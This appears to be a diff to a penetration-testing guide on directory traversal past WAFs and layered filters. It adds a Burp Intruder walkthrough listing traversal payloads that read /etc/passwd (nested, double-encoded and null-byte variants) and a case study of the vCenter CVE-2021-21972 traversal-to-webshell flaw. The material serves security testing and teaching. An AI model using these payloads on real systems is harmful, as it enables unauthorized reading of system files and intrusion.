@@ -1,5 +1,21 @@
 # Directory Traversal: Bypassing Extreme Filtering with Burp Intruder & Automated Fuzzing
 
+> [!TIP]
+> ### ⚡ Quick Solution (Direct Execution)
+> 1. Forward the image request to **Burp Intruder** (`Ctrl+I`).
+> 2. Position the Sniper marker: `GET /image?filename=§50.jpg§ HTTP/1.1`.
+> 3. In the **Payloads** tab, load the traversal mutations list (nested, encoding, null byte):
+>    ```text
+>    ../../../etc/passwd
+>    ....//....//....//etc/passwd
+>    ..%252f..%252f..%252fetc/passwd
+>    /var/www/images/../../../etc/passwd%00.png
+>    ```
+> 4. **CRITICAL:** Uncheck the **"URL-encode these characters"** option at the bottom.
+> 5. Click **Start attack**, sort results by **Length** $\rightarrow$ identify the payload exposing `/etc/passwd`.
+
+---
+
 In advanced penetration testing engagements, red team operations, and CTF challenges, security testers frequently encounter **Extreme Filtering**—architectures where multiple defensive layers are deployed simultaneously:
 1. **Web Application Firewalls (WAFs)** blocking standard `../` and `%2e%2e%2f` signatures.
 2. **Reverse Proxies / Load Balancers** performing partial decoding and path normalization.
@@ -177,6 +193,14 @@ Here are 15 high-impact mutation payloads for immediate testing:
 ```
 
 ---
+
+## 🌍 Real-World Case Study & Security Incidents
+
+### VMware vCenter Server Fuzzing & Traversal RCE (CVE-2021-21972)
+When enterprise products implement complex nested filters, mutation-based fuzzing uncovers critical zero-days:
+* **Target Architecture:** VMware vCenter Server orchestrates virtual machines across large corporate datacenters. Plugin installation endpoints were guarded by layered regex patterns and WAF rules.
+* **Automated Mutation Fuzzing:** Researchers fuzzed the parameter using automated mutation dictionaries. Specific combinations of double encoding and mixed slashes bypassed Java Spring's sanitization, permitting arbitrary JSP webshell uploads outside the intended directory.
+* **CVSS & Impact:** Rated **CVSS 9.8 (CRITICAL)**, this vulnerability allowed attackers to gain SYSTEM/root access over entire hypervisor clusters without requiring any prior authentication.
 
 ## 6. Comprehensive Mitigation Guidelines (Defense-in-Depth)
 
